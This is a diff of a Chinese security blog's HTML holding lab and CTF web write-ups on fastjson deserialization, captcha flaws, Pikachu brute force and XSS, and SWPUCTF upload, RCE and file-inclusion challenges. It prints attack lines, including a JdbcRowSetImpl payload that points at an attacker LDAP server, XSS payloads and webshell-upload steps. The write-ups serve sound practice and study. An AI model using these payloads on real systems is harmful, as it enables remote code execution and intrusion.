&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">      &quot;dataSourceName&quot;:&quot;ldap://本机ip:1389/Touch&quot;,</span><br><span class="line">      &quot;autoCommit&quot;:true</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>发送后会显示</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311554700.png" alt="image-20240531155441657"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311555719.png" alt="image-20240531155505690"></p>
+<p>查看docker文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311556646.png" alt="image-20240531155609569"></p>
+
+        <h1 id="验证码相关漏洞"   >
+          <a href="#验证码相关漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证码相关漏洞" class="headerlink" title="验证码相关漏洞"></a>验证码相关漏洞</h1>
+      
+        <h3 id="代码分析-1"   >
+          <a href="#代码分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141031.png" alt="image-20240529214056931"></p>
+<p>成员变量 <code>Code</code> 用于存储生成的验证码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141142.png" alt="image-20240529214151097"></p>
+<p>创建一个 <code>Random</code> 对象生成一个随机数 <code>number</code>，范围在 <code>0</code> 到 <code>899999</code> 之间</p>
+<p>将生成的验证码 <code>number</code> 添加到模型中，键为 <code>code</code></p>
+<p>将生成的验证码打印到控制台</p>
+<p>将成员变量 <code>Code</code> 设置为生成的验证码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292142029.png" alt="image-20240529214237991"></p>
+<p>初始化结果字符串 <code>result</code> 为 <code>&quot;fail&quot;</code></p>
+<p>检查 <code>code1</code> 是否不为空且不为 <code>0</code>，并且是否与生成的验证码 <code>Code</code> 相等，如果验证通过，打印 <code>true</code> 到控制台，并将 <code>result</code> 设置为 <code>&quot;sueecss&quot;</code>（拼写错了）</p>
+<p>将结果字符串 <code>result</code> 添加到模型中，键为 <code>code1</code></p>
+
+        <h3 id="漏洞复现-1"   >
+          <a href="#漏洞复现-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292144331.png" alt="image-20240529214414283"></p>
+<p>获取验证码</p>
+<p>在这里可以找到生成的随机数，即验证码（直接查看网页源代码也有）</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145052.png" alt="image-20240529214501002"></p>
+<p>输入登录后，返回sueecss</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145841.png" alt="image-20240529214532798"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/23/pikachu%E9%9D%B6%E5%9C%BA/">pikachu-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-30</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h1 id="暴力破解"   >
           <a href="#暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1>
       
@@ -77,7 +299,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
         <h2 id="验证码绕过-on-server"   >
           <a href="#验证码绕过-on-server" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231313733.png" alt="image-20240523131332711"></p>
-<p>随便输入一串数字登录，抓包并发送到Intruder，按上一题一样设置，开始攻击，根据长度的特别可以找到正确的账号密码</p>
+<p>随便输入一串数字登录，抓包并发送到Intruder，验证码改成正确的，按上一题一样设置，开始攻击，根据长度的特别可以找到正确的账号密码</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231314702.jpg" alt="img"></p>
 
         <h2 id="验证码绕过-on-client"   >
@@ -2088,7 +2310,10 @@ exit;
 <p>界面有变化，但是没成功，查看网页源代码</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241458877.png"></p>
 <p>可以看到&lt;&gt;更改了，但是插入到value参数中的代码并没有更改而是直接返回</p>
-<p>上网搜索后发现是“看到<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>被嵌套到value属性中，所以我们需要闭合input标签。”</p>
+<p>上网搜索后发现是“看到</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>被嵌套到value属性中，所以我们需要闭合input标签。”</p>
 
         <h6 id="用例子解释一下这个闭合"   >
           <a href="#用例子解释一下这个闭合" class="heading-link"><i class="fas fa-link"></i></a><a href="#用例子解释一下这个闭合" class="headerlink" title="用例子解释一下这个闭合"></a>用例子解释一下这个闭合</h6>
@@ -2341,9 +2566,9 @@ exit;
 <p><code>?arg01=a&amp;arg02=b%20onmouseover=alert(1)</code></p>
 <p>(onclick不行，应该是因为加载不出图片无法点击，所以用不了这个事件)</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310190923882.png" alt="image-20231019092332845"></p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/01/06/NSSCTF%20WEB/">NSSCTF WEB</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-28</span></span></div></header><div class="post-body"><div class="post-excerpt">
-        <h2 id="一、-SWPUCTF-2021-新生赛-jicao"   >
-          <a href="#一、-SWPUCTF-2021-新生赛-jicao" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-SWPUCTF-2021-新生赛-jicao" class="headerlink" title="一、[SWPUCTF 2021 新生赛]jicao"></a>一、[SWPUCTF 2021 新生赛]jicao</h2>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/01/06/NSSCTF%20WEB/">NSSCTF WEB</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-29</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="一、-SWPUCTF-2021-新生赛-jicao"   >
+          <a href="#一、-SWPUCTF-2021-新生赛-jicao" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-SWPUCTF-2021-新生赛-jicao" class="headerlink" title="一、[SWPUCTF 2021 新生赛]jicao"></a>一、[SWPUCTF 2021 新生赛]jicao</h1>
       <p>打开后出现这样一堆代码</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071607884.png" alt="image-20230107160708841"></p>
 <p>经阅读可知，要想获取flag，需要POST一个值为wllmNB的参数id和GET一个值为{“x“：”wllm“}的参数json（json值的来源：[x]相当于数组的下标，冒号相当于解释说明该数组下标，然后查资料得json的格式为<code>$json = &#39;&#123;&quot;a&quot;:&quot;php&quot;,&quot;b&quot;:&quot;mysql&quot;,&quot;c&quot;:3&#125;&#39;</code>）</p>
@@ -2370,8 +2595,8 @@ exit;
 <p>GO之后得到flag</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081023505.png" alt="image-20230108102344407"></p>
 
-        <h2 id="二、-SWPUCTF-2021-新生赛-Do-you-know-http"   >
-          <a href="#二、-SWPUCTF-2021-新生赛-Do-you-know-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、-SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="二、[SWPUCTF 2021 新生赛]Do_you_know_http"></a>二、[SWPUCTF 2021 新生赛]Do_you_know_http</h2>
+        <h1 id="二、-SWPUCTF-2021-新生赛-Do-you-know-http"   >
+          <a href="#二、-SWPUCTF-2021-新生赛-Do-you-know-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、-SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="二、[SWPUCTF 2021 新生赛]Do_you_know_http"></a>二、[SWPUCTF 2021 新生赛]Do_you_know_http</h1>
       <p>点开环境</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071718113.png" alt="image-20230107171822067"></p>
 <p>告诉我们需要用WLLM浏览器，那就用HackBar添加头</p>
@@ -2388,15 +2613,15 @@ exit;
           <a href="#附上常见请求报文的代表含义" class="heading-link"><i class="fas fa-link"></i></a><a href="#附上常见请求报文的代表含义" class="headerlink" title="附上常见请求报文的代表含义"></a>附上常见请求报文的代表含义</h6>
       <p><em>User-Agent：产生请求的浏览器类型，一般可以随意指定，但是当服务器方面有限制则会受到影响，比如爬虫进行检查</em><br><em>Accept：用户声明客户端可以处理的MIME类型，即文件类型</em><br><em>Accept-Encoding：用于声明客户端能够理解的内容编码方式</em><br><em>Accept-Language：用于声明客户端可以理解的自然语言</em><br><em>Cookie：存放用户的身份凭证</em><br><em>Content-Length：请求数据的长度，服务器端只会按照该字段进行长度解析，多余的截断。</em><br><em>Referer：当前访问URL的上一个URL，用户从什么地方来到该页面的</em></p>
 
-        <h2 id="三、-SWPUCTF-2021-新生赛-gift-F12"   >
-          <a href="#三、-SWPUCTF-2021-新生赛-gift-F12" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、-SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="三、[SWPUCTF 2021 新生赛]gift_F12"></a>三、[SWPUCTF 2021 新生赛]gift_F12</h2>
+        <h1 id="三、-SWPUCTF-2021-新生赛-gift-F12"   >
+          <a href="#三、-SWPUCTF-2021-新生赛-gift-F12" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、-SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="三、[SWPUCTF 2021 新生赛]gift_F12"></a>三、[SWPUCTF 2021 新生赛]gift_F12</h1>
       <p>打开后</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081048166.png" alt="image-20230108104838977"></p>
 <p>直接查看网页源代码，并搜索flag，即可得到</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081050326.png" alt="image-20230108105014274"></p>
 
-        <h2 id="四、-第五空间-2021-WebFTP"   >
-          <a href="#四、-第五空间-2021-WebFTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-第五空间-2021-WebFTP" class="headerlink" title="四、[第五空间 2021]WebFTP"></a>四、[第五空间 2021]WebFTP</h2>
+        <h1 id="四、-第五空间-2021-WebFTP"   >
+          <a href="#四、-第五空间-2021-WebFTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-第五空间-2021-WebFTP" class="headerlink" title="四、[第五空间 2021]WebFTP"></a>四、[第五空间 2021]WebFTP</h1>
       <p>打开环境后是一个登录界面</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131504554.png" alt="image-20230113150457454"></p>
 <p>首先考虑是否是sql注入</p>
@@ -2417,8 +2642,8 @@ exit;
 <p>回车后查找flag</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131556083.png" alt="image-20230113155649987"></p>
 
-        <h2 id="五、-SWPUCTF-2021-新生赛-easy-md5"   >
-          <a href="#五、-SWPUCTF-2021-新生赛-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="五、[SWPUCTF 2021 新生赛]easy_md5"></a>五、[SWPUCTF 2021 新生赛]easy_md5</h2>
+        <h1 id="五、-SWPUCTF-2021-新生赛-easy-md5"   >
+          <a href="#五、-SWPUCTF-2021-新生赛-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="五、[SWPUCTF 2021 新生赛]easy_md5"></a>五、[SWPUCTF 2021 新生赛]easy_md5</h1>
       <p>打开后</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301111241802.png" alt="image-20230111124106656"></p>
 <p>首先是需要GET变量name和POST变量password，这一点类似于第一题，可以明确使用HackBar</p>
@@ -2446,8 +2671,8 @@ exit;
           <a href="#附：MD5绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#附：MD5绕过" class="headerlink" title="附：MD5绕过"></a>附：MD5绕过</h6>
       <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116779357" >https://blog.csdn.net/LYJ20010728/article/details/116779357</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 
-        <h2 id="六、-SWPUCTF-2021-新生赛-include"   >
-          <a href="#六、-SWPUCTF-2021-新生赛-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、-SWPUCTF-2021-新生赛-include" class="headerlink" title="六、[SWPUCTF 2021 新生赛]include"></a>六、[SWPUCTF 2021 新生赛]include</h2>
+        <h1 id="六、-SWPUCTF-2021-新生赛-include"   >
+          <a href="#六、-SWPUCTF-2021-新生赛-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、-SWPUCTF-2021-新生赛-include" class="headerlink" title="六、[SWPUCTF 2021 新生赛]include"></a>六、[SWPUCTF 2021 新生赛]include</h1>
       <p>打开环境后要求上传一个文件</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141346762.png" alt="image-20230114134608687"></p>
 <p>那就随便上传一个文件</p>
@@ -2467,8 +2692,8 @@ exit;
           <a href="#附：常用php伪协议-celtyl" class="heading-link"><i class="fas fa-link"></i></a><a href="#附：常用php伪协议-celtyl" class="headerlink" title="附：常用php伪协议 celtyl"></a>附：常用php伪协议 celtyl</h6>
       <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html" >https://www.cnblogs.com/wjrblogs/p/12285202.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 
-        <h2 id="七、-SWPUCTF-2021-新生赛-PseudoProtocols"   >
-          <a href="#七、-SWPUCTF-2021-新生赛-PseudoProtocols" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="七、[SWPUCTF 2021 新生赛]PseudoProtocols"></a>七、[SWPUCTF 2021 新生赛]PseudoProtocols</h2>
+        <h1 id="七、-SWPUCTF-2021-新生赛-PseudoProtocols"   >
+          <a href="#七、-SWPUCTF-2021-新生赛-PseudoProtocols" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="七、[SWPUCTF 2021 新生赛]PseudoProtocols"></a>七、[SWPUCTF 2021 新生赛]PseudoProtocols</h1>
       <p>打开后</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141421711.png" alt="image-20230114142111659"></p>
 <p>它想让我们找hint.php文件，而且注意到此时URL上已经传入了参数wllm，可以使用伪协议读取这个hint.php文件</p>
@@ -2488,8 +2713,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141433590.png" alt="image-20230114143315508"></p>
 <p>（PS：也可以直接输入<code>?a=data://text/plain,I want flag</code>，即不将I want flag变成base64编码格式）</p>
 
-        <h2 id="八、-NISACTF-2022-easyssrf"   >
-          <a href="#八、-NISACTF-2022-easyssrf" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、-NISACTF-2022-easyssrf" class="headerlink" title="八、[NISACTF 2022]easyssrf"></a>八、[NISACTF 2022]easyssrf</h2>
+        <h1 id="八、-NISACTF-2022-easyssrf"   >
+          <a href="#八、-NISACTF-2022-easyssrf" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、-NISACTF-2022-easyssrf" class="headerlink" title="八、[NISACTF 2022]easyssrf"></a>八、[NISACTF 2022]easyssrf</h1>
       <p>打开后</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141524463.png" alt="image-20230114152400330"></p>
 <p>随便输个网址尝试一下</p>
@@ -2509,8 +2734,8 @@ exit;
 <p>解码后获得flag</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301141531378.png" alt="image-20230114153154328"></p>
 
-        <h2 id="九、-SWPUCTF-2021-新生赛-ez-unserialize"   >
-          <a href="#九、-SWPUCTF-2021-新生赛-ez-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、-SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="九、[SWPUCTF 2021 新生赛]ez_unserialize"></a>九、[SWPUCTF 2021 新生赛]ez_unserialize</h2>
+        <h1 id="九、-SWPUCTF-2021-新生赛-ez-unserialize"   >
+          <a href="#九、-SWPUCTF-2021-新生赛-ez-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、-SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="九、[SWPUCTF 2021 新生赛]ez_unserialize"></a>九、[SWPUCTF 2021 新生赛]ez_unserialize</h1>
       <p>打开环境后</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161247333.png" alt="image-20230116124720192"></p>
 <p>没有看见题目，查看网页源代码和用burpsuite都没有发现，用dirsearch工具扫描一下</p>
@@ -2552,8 +2777,8 @@ exit;
           <a href="#附：CTF中的序列化与反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#附：CTF中的序列化与反序列化" class="headerlink" title="附：CTF中的序列化与反序列化"></a>附：CTF中的序列化与反序列化</h6>
       <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.manongjc.com/detail/17-iffyxbsaebsmupt.html" >http://www.manongjc.com/detail/17-iffyxbsaebsmupt.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 
-        <h2 id="十、-SWPUCTF-2021-新生赛-no-wakeup"   >
-          <a href="#十、-SWPUCTF-2021-新生赛-no-wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="十、[SWPUCTF 2021 新生赛]no_wakeup"></a>十、[SWPUCTF 2021 新生赛]no_wakeup</h2>
+        <h1 id="十、-SWPUCTF-2021-新生赛-no-wakeup"   >
+          <a href="#十、-SWPUCTF-2021-新生赛-no-wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="十、[SWPUCTF 2021 新生赛]no_wakeup"></a>十、[SWPUCTF 2021 新生赛]no_wakeup</h1>
       <p>打开环境后</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061554316.png" alt="image-20230906155442200"></p>
 <p>点金连接后，也是一串代码</p>
@@ -2565,12 +2790,12 @@ exit;
 <p>回车得到flag</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161338946.png" alt="image-20230116133842852"></p>
 
-        <h2 id="十一、-HCTF-2018-Warmup"   >
-          <a href="#十一、-HCTF-2018-Warmup" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-HCTF-2018-Warmup" class="headerlink" title="十一、[HCTF 2018]Warmup"></a>十一、[HCTF 2018]Warmup</h2>
+        <h1 id="十一、-HCTF-2018-Warmup"   >
+          <a href="#十一、-HCTF-2018-Warmup" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-HCTF-2018-Warmup" class="headerlink" title="十一、[HCTF 2018]Warmup"></a>十一、[HCTF 2018]Warmup</h1>
       <p>见”BUU-1.md”</p>
 
-        <h2 id="十五、-SWPUCTF-2021-新生赛-easyupload1-0"   >
-          <a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="十五、[SWPUCTF 2021 新生赛]easyupload1.0"></a>十五、[SWPUCTF 2021 新生赛]easyupload1.0</h2>
+        <h1 id="十五、-SWPUCTF-2021-新生赛-easyupload1-0"   >
+          <a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="十五、[SWPUCTF 2021 新生赛]easyupload1.0"></a>十五、[SWPUCTF 2021 新生赛]easyupload1.0</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151651849.png" alt="image-20240115165127781"></p>
 <p>上传一个写有一句话木马的php格式的文件</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151652289.png" alt="image-20240115165250245"></p>
@@ -2588,8 +2813,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151659646.png" alt="image-20240115165912580"></p>
 <p>尝试提交发现是假的，，，</p>
 
-        <h2 id="十六、-SWPUCTF-2021-新生赛-easyupload2-0"   >
-          <a href="#十六、-SWPUCTF-2021-新生赛-easyupload2-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、-SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="十六、[SWPUCTF 2021 新生赛]easyupload2.0"></a>十六、[SWPUCTF 2021 新生赛]easyupload2.0</h2>
+        <h1 id="十六、-SWPUCTF-2021-新生赛-easyupload2-0"   >
+          <a href="#十六、-SWPUCTF-2021-新生赛-easyupload2-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、-SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="十六、[SWPUCTF 2021 新生赛]easyupload2.0"></a>十六、[SWPUCTF 2021 新生赛]easyupload2.0</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281112129.png" alt="image-20240528111251083"></p>
 <p>文件上传题，上传一个写有一句话木马的php文件后提示不行，那上传一个jpg格式的</p>
 <p>上传成功，抓一下包改后缀为php</p>
@@ -2605,12 +2830,12 @@ exit;
 <p>添加数据后打开文件管理，找到flag.php</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281324123.png" alt="image-20240528132410073"></p>
 
-        <h2 id="十七、-GXYCTF2019-BabyUpload-1"   >
-          <a href="#十七、-GXYCTF2019-BabyUpload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十七、-GXYCTF2019-BabyUpload-1" class="headerlink" title="十七、[GXYCTF2019]BabyUpload 1"></a>十七、[GXYCTF2019]BabyUpload 1</h2>
+        <h1 id="十七、-GXYCTF2019-BabyUpload-1"   >
+          <a href="#十七、-GXYCTF2019-BabyUpload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十七、-GXYCTF2019-BabyUpload-1" class="headerlink" title="十七、[GXYCTF2019]BabyUpload 1"></a>十七、[GXYCTF2019]BabyUpload 1</h1>
       <p>见“BUU-1.md”</p>
 
-        <h2 id="十八、-SWPUCTF-2021-新生赛-caidao"   >
-          <a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="heading-link"><i class="fas fa-link"></i></a><a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="headerlink" title="十八、[SWPUCTF 2021 新生赛]caidao"></a>十八、[SWPUCTF 2021 新生赛]caidao</h2>
+        <h1 id="十八、-SWPUCTF-2021-新生赛-caidao"   >
+          <a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="heading-link"><i class="fas fa-link"></i></a><a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="headerlink" title="十八、[SWPUCTF 2021 新生赛]caidao"></a>十八、[SWPUCTF 2021 新生赛]caidao</h1>
       <p>打开环境后</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161536904.png" alt="image-20230116153620739"></p>
 <p>是一句话木马，便可以用蚁剑</p>
@@ -2623,8 +2848,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161538981.png" alt="image-20230116153858927"></p>
 <p>该题类似于[极客大挑战 2019]Knife 1</p>
 
-        <h2 id="十九、-SWPUCTF-2021-新生赛-easyrce"   >
-          <a href="#十九、-SWPUCTF-2021-新生赛-easyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#十九、-SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="十九、[SWPUCTF 2021 新生赛]easyrce"></a>十九、[SWPUCTF 2021 新生赛]easyrce</h2>
+        <h1 id="十九、-SWPUCTF-2021-新生赛-easyrce"   >
+          <a href="#十九、-SWPUCTF-2021-新生赛-easyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#十九、-SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="十九、[SWPUCTF 2021 新生赛]easyrce"></a>十九、[SWPUCTF 2021 新生赛]easyrce</h1>
       <p>打开后</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061640144.png" alt="image-20230906164009106"></p>
 <p>题目已经提示了这是RCE题目，而且使用GET方法</p>
@@ -2640,13 +2865,13 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061648745.png" alt="image-20230906164823704"></p>
 <p>得到flag</p>
 
-        <h2 id="二十、-SWPUCTF-2021-新生赛-easyupload3-0"   >
-          <a href="#二十、-SWPUCTF-2021-新生赛-easyupload3-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十、-SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="二十、[SWPUCTF 2021 新生赛]easyupload3.0"></a>二十、[SWPUCTF 2021 新生赛]easyupload3.0</h2>
+        <h1 id="二十、-SWPUCTF-2021-新生赛-easyupload3-0"   >
+          <a href="#二十、-SWPUCTF-2021-新生赛-easyupload3-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十、-SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="二十、[SWPUCTF 2021 新生赛]easyupload3.0"></a>二十、[SWPUCTF 2021 新生赛]easyupload3.0</h1>
       <p>同[GXYCTF2019]BabyUpload 1</p>
 <p>依然是配置文件再上传一句话木马，最后flag在/var/www/html目录里</p>
 
-        <h2 id="二十一、-SWPUCTF-2021-新生赛-babyrce"   >
-          <a href="#二十一、-SWPUCTF-2021-新生赛-babyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十一、-SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="二十一、[SWPUCTF 2021 新生赛]babyrce"></a>二十一、[SWPUCTF 2021 新生赛]babyrce</h2>
+        <h1 id="二十一、-SWPUCTF-2021-新生赛-babyrce"   >
+          <a href="#二十一、-SWPUCTF-2021-新生赛-babyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十一、-SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="二十一、[SWPUCTF 2021 新生赛]babyrce"></a>二十一、[SWPUCTF 2021 新生赛]babyrce</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111432130.png" alt="image-20240111143209010"></p>
 <p>阅读代码可知，修改Cookie的值为 admin=1</p>
 <p>使用HackBar修改</p>
@@ -2664,15 +2889,15 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111443632.png" alt="image-20240111144342560"></p>
 <p>获得flag</p>
 
-        <h2 id="二十二、-LitCTF-2023-我Flag呢？"   >
-          <a href="#二十二、-LitCTF-2023-我Flag呢？" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十二、-LitCTF-2023-我Flag呢？" class="headerlink" title="二十二、[LitCTF 2023]我Flag呢？"></a>二十二、[LitCTF 2023]我Flag呢？</h2>
+        <h1 id="二十二、-LitCTF-2023-我Flag呢？"   >
+          <a href="#二十二、-LitCTF-2023-我Flag呢？" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十二、-LitCTF-2023-我Flag呢？" class="headerlink" title="二十二、[LitCTF 2023]我Flag呢？"></a>二十二、[LitCTF 2023]我Flag呢？</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111448541.png" alt="image-20240111144816063"></p>
 <p>直接查看网页源代码</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111448288.png" alt="image-20240111144844220"></p>
 <p>得到flag</p>
 
-        <h2 id="二十三、-LitCTF-2023-PHP是世界上最好的语言！！"   >
